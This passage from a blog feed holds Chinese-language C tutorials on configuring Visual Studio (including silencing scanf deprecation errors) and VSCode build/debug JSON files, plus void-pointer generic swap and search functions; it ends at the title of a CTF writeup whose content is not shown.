src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231218000958855.png" alt="image-20231218000958855" style="zoom:33%;" /><ol start="3"><li>创建项目注意一定是C++的，不要创建成C#项目</li></ol><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231218000442912.png" alt="image-20231218000442912" style="zoom: 33%;" /><ol start="4"><li>配置项目名和路径，最好找一个目录，专门存每次的代码，例如<code>D:\code\My_VS_Code\</code></li></ol><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231218000630109.png" alt="image-20231218000630109" style="zoom:33%;" /><ol start="5"><li>VS编写C代码不能使用scanf等函数,解决方法见:</li></ol><p>​<a href="https://gngtwhh.github.io/2023-09-19-bb3b8099b657/">C语言教程-2-环境搭建</a></p><ol start="6"><li>一个项目只对应一个程序,一个程序只能有一个main()入口,哪怕你在一个项目里开了一堆源文件,也只能保留一个main(),因为这些源文件属于一个程序,不理解请移步<code>谷歌</code>搜索<code>C语言多文件编程</code></li><li>待补充</li></ol><h3 id="安全检查的问题">安全检查的问题</h3><p>另外,要注意的一点就是,VS默认是进行C++的开发,所以你会发现后缀都是.cpp,你改成.c也可以.还有很重要的一点就是,msvc(或者说VS这个IDE)默认是不允许使用scanf等函数的,因为他认为这些函数并不安全(具体原因以后解释,涉及到越界/栈溢出的问题),所以转而要求你使用scanf_s等函数来代替,报错如图:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919192737049.png" alt="image-20230919192737049"></p><p>报错是英文的:<code>'scanf': This function or variable may be unsafe.</code>,所以英语也要多少会一点,不至于连报错提示都看不懂.</p><p>但是,我想说一句话:</p><p><code>学习过程中你可以犯错,让编译器去迁就你,但是如果你要去因为一个编译器的特殊性,你要去迁就编译器,那你这学的就一塌糊涂</code></p><p>我们学C,首先要学的就是标准C,至少也得是ANSI C,不过2023年了,我们至少要学习C99的标准.</p><p>scanf_s等函数是在C11才出现的,目前各大编译器的支持度不高,而且scanf_s和scanf的使用方法也并不相同,所以,一句话,不要使用scanf_s.</p><p>注:解决的是<code>错误</code>,即使用scanf编译会报错,而警告<code>scanf的返回值被忽略</code>不仅仅是VS会警告,其他软件也会警告,这是一个良好的警告,但我们无需关心—scanf的返回值确实有用,但是简单的程序用不到.</p><p>那么为了在VS中正常使用scanf等函数,我们有三种解决办法:</p><h4 id="方法1">方法1:</h4><p>关闭SDL检查</p><p>SDL(Security Development Lifecycle)，安全开发生命周期检查，微软在VS2012新推出的东西，为了能更好的监管开发者的代码安全，如果勾选了这一项则将严格按照SDL的规则编译代码，会有一些以前常用的函数无法通过编译。</p><p>我们只需要把项目的SDL检查关闭即可,<code>注意:每次新建项目都需要进行处理,包括下面的其他方法!</code></p><p>在菜单栏依次点击 项目-&gt;[你的项目名]属性,打开属性窗口,再次点击 配置属性-&gt;C/C+±&gt;常规-&gt;SDL检查:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928163054328.png" alt="image-20230928163054328" style="zoom:33%;" /><p>将SDL检查从<code>是</code>修改为<code>否</code>即可.</p><h4 id="方法2">方法2:</h4><p>为项目添加<code>_CRT_SECURE_NO_DEPRECATE</code>预处理器定义</p><p>在菜单栏依次点击 项目-&gt;[你的项目名]属性,打开属性窗口,再次点击 配置属性-&gt;C/C+±&gt;预处理器-&gt;预处理器定义:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919192447314.png" alt="image-20230919192447314" style="zoom: 33%;" /><p>在结尾先添加一个<code>;</code> ,然后输入<code>_CRT_SECURE_NO_DEPRECATE</code>这一段,点击保存,这时,回到你的包含scanf的程序,再次运行,即可正常:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919193040954.png" alt="image-20230919193040954" style="zoom: 33%;" /><h4 id="方法3">方法3:</h4><p>在每个源文件开头添加一行代码:<code>#define _CRT_SECURE_NO_WARNINGS 1</code>即可:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919193744735.png" alt="image-20230919193744735" style="zoom:33%;" /><p>到此为止,VS2022的基本安装结束,以后遇到任何问题,请不要吝惜你的浏览器,先去网上找解决方案,一搜一大把.</p><h3 id="程序无法写入的问题">程序无法写入的问题</h3><p>有时候会发生编译时无法对程序写入的错误，这是因为上次调试的进程未正确关闭，程序句柄仍在占用，导致拒绝写入目标程序：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240926120138.png" alt="image.png|725"></p><p>解决办法是在任务管理器中杀死对应程序。<br>例如上图中的程序名为 <code>Project1.exe</code> ，按下 <code>ctrl+shift+esc</code> 打开任务管理器，搜索 <code>Project1</code> 然后将对应进程结束即可：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240926120412.png" alt="image.png|600"></p><h2 id="编译器使用">编译器使用</h2><h3 id="gcc-g-编译">gcc/g++编译</h3><h2 id="高级文本编辑器配置">高级文本编辑器配置</h2><h3 id="vscode配置c-c-的基本编译-运行调试环境">VSCode配置C/C++的基本编译/运行调试环境</h3><p>注：本节可以参考 <code>C语言教程-2-环境搭建</code>。</p><p>首先,刚接触C的新手建议离开,一定程度上熟悉了编程的萌新可以逝逝.</p><p>VScode的项目设置由目录下的<code>.vscode</code>中的json配置文件控制,我们需要配置3个文件:</p><p><code>c_cpp_properties.json</code>,<code>tasks.json</code>,<code>launch.json</code></p><p><code>c_cpp_properties.json</code>为C/C++语言相关的一些配置参数;</p><p><code>tasks.json</code>为任务配置文件,其中的每一个子项就是一个任务,我们可以将各种编译任务在这里配置.</p><p><code>launch.json</code>为启动配置文件,用于启动编译后的程序,进行运行或调试;</p><h4 id="c-cpp-properties-json">c_cpp_properties.json</h4><p>使用这个配置文件对C/C++源文件进行编译选项和环境的配置.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Win32&quot;</span><span class="punctuation">,</span> <span class="comment">// 表示这个配置项是为 Win32 平台准备的</span></span><br><span class="line">            <span class="attr">&quot;includePath&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="comment">// 指定了用于查找头文件的目录</span></span><br><span class="line">                <span class="string">&quot;$&#123;workspaceFolder&#125;/**&quot;</span> <span class="comment">// 将会包含工作区文件夹下的所有子目录</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;defines&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="comment">// 定义宏的数组，这些宏将在编译过程中生效</span></span><br><span class="line">                <span class="string">&quot;_DEBUG&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;UNICODE&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;_UNICODE&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;windowsSdkVersion&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10.0.19041.0&quot;</span><span class="punctuation">,</span> <span class="comment">// 指定 Windows SDK 版本的配置项</span></span><br><span class="line">            <span class="attr">&quot;compilerPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;path&gt;/mingw64/bin/g++.exe&quot;</span><span class="punctuation">,</span> <span class="comment">// 指定编译器路径的配置项,指定了g++编译器的完整路径,这里的&lt;path&gt;是你的mingw安装路径</span></span><br><span class="line">            <span class="attr">&quot;cStandard&quot;</span><span class="punctuation">:</span> <span class="string">&quot;c17&quot;</span><span class="punctuation">,</span> <span class="comment">// 指定C17标准</span></span><br><span class="line">            <span class="attr">&quot;cppStandard&quot;</span><span class="punctuation">:</span> <span class="string">&quot;c++17&quot;</span><span class="punctuation">,</span> <span class="comment">// 指定C++17标准</span></span><br><span class="line">            <span class="attr">&quot;intelliSenseMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;windows-gcc-x64&quot;</span> <span class="comment">// 使用 Windows 平台上的 GCC 编译器进行 IntelliSense 代码补全和语法检查</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="number">4</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="tasks-json">tasks.json</h4><p>这个文件配置了各种任务,我们进行编译操作的配置.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;tasks&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="comment">// 该列表的每一项都是一个任务</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cppbuild&quot;</span><span class="punctuation">,</span> <span class="comment">// 类型</span></span><br><span class="line">            <span class="attr">&quot;label&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C++ Build&quot;</span><span class="punctuation">,</span> <span class="comment">// 重要,任务名</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;path&gt;/mingw64/bin/g++.exe&quot;</span><span class="punctuation">,</span> <span class="comment">// 调用g++对C++进行编译</span></span><br><span class="line">            <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="comment">// 命令行参数</span></span><br><span class="line">                <span class="string">&quot;-fdiagnostics-color=always&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;-g&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;$&#123;file&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;-std=c++11&quot;</span><span class="punctuation">,</span> <span class="comment">// C++11标准</span></span><br><span class="line">                <span class="string">&quot;-o&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.exe&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;options&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;path&gt;/mingw64/bin&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;problemMatcher&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;$gcc&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;group&quot;</span><span class="punctuation">:</span> <span class="string">&quot;build&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;detail&quot;</span><span class="punctuation">:</span> <span class="string">&quot;使用 g++ 进行c++单个文件的编译&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cppbuild&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;label&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C Build&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;path&gt;/mingw64/bin/gcc.exe&quot;</span><span class="punctuation">,</span> <span class="comment">// 调用gcc对C进行编译</span></span><br><span class="line">            <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;-fdiagnostics-color=always&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;-g&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;$&#123;file&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;-std=c11&quot;</span><span class="punctuation">,</span> <span class="comment">// C11标准</span></span><br><span class="line">                <span class="string">&quot;-o&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.exe&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;options&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;path&gt;/mingw64/bin&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;problemMatcher&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;$gcc&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;group&quot;</span><span class="punctuation">:</span> <span class="string">&quot;build&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;detail&quot;</span><span class="punctuation">:</span> <span class="string">&quot;使用 gcc 进行c语言单个文件的编译&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cppbuild&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;label&quot;</span><span class="punctuation">:</span> <span class="string">&quot;c/c++ debug&quot;</span><span class="punctuation">,</span> <span class="comment">// 这个任务专门用于调试</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;path&gt;/mingw64/bin/g++.exe&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;-fdiagnostics-color=always&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;-g&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;$&#123;file&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;-o&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;$&#123;fileDirname&#125;\\$&#123;fileBasenameNoExtension&#125;.exe&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;options&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;path&gt;/mingw64/bin&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;problemMatcher&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;$gcc&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;group&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;kind&quot;</span><span class="punctuation">:</span> <span class="string">&quot;build&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;isDefault&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;detail&quot;</span><span class="punctuation">:</span> <span class="string">&quot;调试器生成的任务。&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="launch-json">launch.json</h4><p>这里是启动配置,这里配置了调试的配置信息.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C/C++ debug&quot;</span><span class="punctuation">,</span> <span class="comment">// 启动配置的名称</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cppdbg&quot;</span><span class="punctuation">,</span> <span class="comment">// C++的debug</span></span><br><span class="line">            <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="comment">// inner shell</span></span><br><span class="line">            <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;fileDirname&#125;//$&#123;fileBasenameNoExtension&#125;.exe&quot;</span><span class="punctuation">,</span> <span class="comment">// 启动对应的程序</span></span><br><span class="line">            <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="comment">// 这里可以用于在外部运行</span></span><br><span class="line">            <span class="comment">// outer shell</span></span><br><span class="line">            <span class="comment">// &quot;program&quot;: &quot;C://Windows//System32//cmd.exe&quot;,</span></span><br><span class="line">            <span class="comment">// &quot;args&quot;: [</span></span><br><span class="line">            <span class="comment">//     &quot;/c&quot;,</span></span><br><span class="line">            <span class="comment">//     &quot;$&#123;fileDirname&#125;//$&#123;fileBasenameNoExtension&#125;.exe&quot;,</span></span><br><span class="line">            <span class="comment">//     &quot;&amp;&quot;,</span></span><br><span class="line">            <span class="comment">//     &quot;echo.&quot;,</span></span><br><span class="line">            <span class="comment">//     &quot;&amp;&quot;,</span></span><br><span class="line">            <span class="comment">//     &quot;pause&quot;,</span></span><br><span class="line">            <span class="comment">// ],</span></span><br><span class="line">            <span class="attr">&quot;stopAtEntry&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;fileDirname&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;environment&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;externalConsole&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> <span class="comment">//设置是否启动外部控制台</span></span><br><span class="line">            <span class="comment">// &quot;avoidWindowsConsoleRedirection&quot;: true,</span></span><br><span class="line">            <span class="attr">&quot;MIMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gdb&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;miDebuggerPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;path&gt;/mingw64/bin/gdb.exe&quot;</span><span class="punctuation">,</span> <span class="comment">// gdb调试器的路径</span></span><br><span class="line">            <span class="attr">&quot;setupCommands&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;为 gdb 启用整齐打印&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;-enable-pretty-printing&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ignoreFailures&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;将反汇编风格设置为 Intel&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;-gdb-set disassembly-flavor intel&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ignoreFailures&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;preLaunchTask&quot;</span><span class="punctuation">:</span> <span class="string">&quot;c/c++ debug&quot;</span> <span class="comment">// 十分重要,在启动前需要运行的任务,该任务参见前面的task.json中的对应任务,即在启动调试前先进行编译</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>​</p><h1 id="代码篇">代码篇</h1><h2 id="输出中文乱码">输出中文乱码</h2><p>以&quot;小熊猫C++&quot;IDE为例.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231226153023590.png" alt="image-20231226153023590" style="zoom:50%;" /><p>检查右下角是否为UTF-8编码,如果是,则需要转换为ANSI编码:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231226153513381.png" alt="image-20231226153513381" style="zoom:50%;" /><p>其他软件类似,这种问题就是<code>GBK</code>和<code>UTF-8</code>编码不兼容的问题.</p><p>Windows默认GBK编码,因此兼容性不佳(一般都是用UTF-8编码比较常见).</p><h2 id="输入输出">输入输出</h2><h2 id="字符串操作">字符串操作</h2><h2 id="栈溢出与安全问题">栈溢出与安全问题</h2><h1 id="风格篇">风格篇</h1><h2 id="代码格式化">代码格式化</h2><br><br><p align=right>---WAHAHA</p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言实现泛型编程</title>
      <link href="/2023c325ef9ea8d5/"/>
      <url>/2023c325ef9ea8d5/</url>
      
        <content type="html"><![CDATA[<p>很遗憾,C语言本身并不支持真正意义上的泛型编程,但是可以通过一些方法在一定程度上实现泛型编程.</p><p>例如使用<code>void *</code>进行<code>类型擦除</code>,实现一定程度上的&quot;泛型&quot;;使用<code>_Generic</code>关键字等…</p><h1 id="使用void-类型擦除来实现">使用void*类型擦除来实现</h1><h2 id="泛型实现一些算法">泛型实现一些算法</h2><h3 id="swap-函数">swap()函数</h3><p>一般的swap只能特定处理某一种类型:</p><p><code>void swap(int*a, int*b);</code></p><p>可以使用<code>void*</code>擦除类型,并用memcpy()进行数据处理:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">void</span> *a,<span class="type">void</span> *b,<span class="type">int</span> size)</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[size]; <span class="comment">// gcc allows</span></span><br><span class="line">    <span class="built_in">memcpy</span>(buf,a,size);</span><br><span class="line">    <span class="built_in">memcpy</span>(a,b,size);</span><br><span class="line">    <span class="built_in">memcpy</span>(b,buf,size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="顺序表lsearch-函数">顺序表lsearch()函数</h3><p>同理,这次用memcmp()进行数据比较:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">lsearch</span><span class="params">(<span class="type">void</span>* base,<span class="type">int</span> n,<span class="type">void</span>* key,<span class="type">int</span> elemSize)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">        <span class="type">void</span> *elemPtr = (<span class="type">char</span>*)base + i*elemSize;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(key,elemPtr,elemSize) == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> elemPtr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 琐碎想法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Writeup-GeekChallenge2023</title>
      <link href="/20238a75fe086e87/"/>
      <url>/20238a75fe086e87/</url>
      
